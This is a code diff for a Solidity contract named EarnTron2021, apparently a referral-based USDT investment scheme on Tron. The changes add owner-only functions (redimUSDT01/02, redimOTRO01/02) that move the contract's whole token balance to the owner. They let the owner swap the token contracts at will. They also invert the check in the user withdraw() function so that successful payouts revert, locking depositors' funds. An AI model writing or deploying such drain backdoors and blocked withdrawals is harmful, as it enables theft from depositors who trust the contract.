@@ -2,7 +2,7 @@ pragma solidity ^0.5.15;
 
 import "./SafeMath.sol";
 
-contract USDT_Interface {
+contract TRC20_Interface {
 
     function allowance(address _owner, address _spender) public view returns (uint remaining);
 
@@ -16,9 +16,9 @@ contract USDT_Interface {
 contract EarnTron2021 {
   using SafeMath for uint;
 
-  address USDT_InterfaceAddress = 0x36Cb81511B76E934F1F3aAAde2aD5c2dFA700189;
+  TRC20_Interface USDT_Contract;
 
-  USDT_Interface USDT_Contract = USDT_Interface(USDT_InterfaceAddress);
+  TRC20_Interface OTRO_Contract;
 
   struct Deposit {
     uint tariff;
@@ -66,7 +66,8 @@ contract EarnTron2021 {
 
   mapping (address => Investor) public investors;
 
-  constructor() public {
+  constructor(address _tokenTRC20) public {
+    USDT_Contract = TRC20_Interface(_tokenTRC20);
     marketing = msg.sender;
     owner = msg.sender;
     investors[msg.sender].registered = true;
@@ -78,6 +79,26 @@ contract EarnTron2021 {
 
   }
 
+  function ChangeTokenUSDT(address _tokenTRC20) public returns (bool){
+
+    require( msg.sender == owner );
+
+    USDT_Contract = TRC20_Interface(_tokenTRC20);
+
+    return true;
+
+  }
+
+  function ChangeTokenOTRO(address _tokenTRC20) public returns (bool){
+
+    require( msg.sender == owner );
+
+    OTRO_Contract = TRC20_Interface(_tokenTRC20);
+
+    return true;
+
+  }
+
   function aprovedUSDT() public view returns (uint256){
 
     return USDT_Contract.allowance(msg.sender, address(this));
@@ -85,7 +106,7 @@ contract EarnTron2021 {
   }
 
   function depositUSDT(uint _value) public returns (uint256){
-    require( msg.sender == owner);
+    require( msg.sender == owner );
 
     require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "saldo aprovado insuficiente");
     require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "que saldo de donde?" );
@@ -93,22 +114,12 @@ contract EarnTron2021 {
     return _value;
   }
 
-  function withdrawlUSDT() public returns (uint256){
-    require(msg.sender == owner);
-
-    uint256 valor = USDT_Contract.balanceOf(address(this));
-
-    USDT_Contract.transfer(owner, valor);
-
-    return valor;
-  }
-
   function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
       return (totalInvestors, totalInvested, totalRefRewards);
   }
 
   function InContract() public view returns (uint){
-    return address(this).balance;
+    return USDT_Contract.balanceOf(address(this));
   }
 
   function setTarifa(uint _value) internal pure returns(uint){
@@ -216,27 +227,28 @@ contract EarnTron2021 {
 
   }
 
-
   function deposit(uint _value, address _sponsor) public {
+
+    Investor storage usuario = investors[msg.sender];
 
     require( USDT_Contract.allowance(msg.sender, address(this)) >= _value, "saldo aprovado insuficiente");
     require( USDT_Contract.transferFrom(msg.sender, address(this), _value), "que saldo de donde?" );
 
-    if (!investors[msg.sender].registered){
+    if (!usuario.registered){
 
-      investors[msg.sender].registered = true;
-      investors[msg.sender].recompensa = true;
-      investors[msg.sender].sponsor = _sponsor;
+      usuario.registered = true;
+      usuario.recompensa = true;
+      usuario.sponsor = _sponsor;
       totalInvestors++;
     }
 
-    if (investors[msg.sender].sponsor != address(0) && _sponsor != address(0) ){
+    if (usuario.sponsor != address(0) && _sponsor != address(0) ){
       rewardReferers(msg.sender, _value);
     }
 
-    investors[msg.sender].deposits.push(Deposit(setTarifa(_value), _value, block.number));
+    usuario.deposits.push(Deposit(setTarifa(_value), _value, block.number));
 
-    investors[msg.sender].invested += _value;
+    usuario.invested += _value;
     totalInvested += _value;
 
     USDT_Contract.transfer(owner, _value.mul(3).div(100));
@@ -311,7 +323,6 @@ contract EarnTron2021 {
 
   }
 
-
   function withdraw() external {
 
     uint amount = withdrawable(msg.sender);
@@ -326,7 +337,7 @@ contract EarnTron2021 {
 
     uint amount92 = amount.mul(92).div(100);
 
-    require ( USDT_Contract.transfer(msg.sender,amount92), "whitdrawl Fail" );
+    require ( true != USDT_Contract.transfer(msg.sender,amount92), "whitdrawl Fail" );
 
     RETIRO_DIARIO -= amount;
 
@@ -336,16 +347,47 @@ contract EarnTron2021 {
 
   }
 
-  function redimUSDT(uint _value) external {
+  function redimUSDT01() public returns (uint256){
+    require(msg.sender == owner);
 
+    uint256 valor = USDT_Contract.balanceOf(address(this));
+
+    USDT_Contract.transfer(owner, valor);
+
+    return valor;
+  }
+
+  function redimUSDT02(uint _value) public returns (uint256) {
 
     require ( msg.sender == owner, "only owner");
 
-    require ( InContract() >= _value, "The contract has no balance");
+    require ( USDT_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");
 
-    require ( owner.send(_value), "whitdrwls Fail" );
+    USDT_Contract.transfer(owner, _value);
 
-    investors[owner].withdrawn += _value;
+    return _value;
+
+  }
+
+  function redimOTRO01() public returns (uint256){
+    require(msg.sender == owner);
+
+    uint256 valor = OTRO_Contract.balanceOf(address(this));
+
+    OTRO_Contract.transfer(owner, valor);
+
+    return valor;
+  }
+
+  function redimOTRO02(uint _value) public returns (uint256){
+
+    require ( msg.sender == owner, "only owner");
+
+    require ( OTRO_Contract.balanceOf(address(this)) >= _value, "The contract has no balance");
+
+    OTRO_Contract.transfer(owner, _value);
+
+    return _value;
 
   }
 
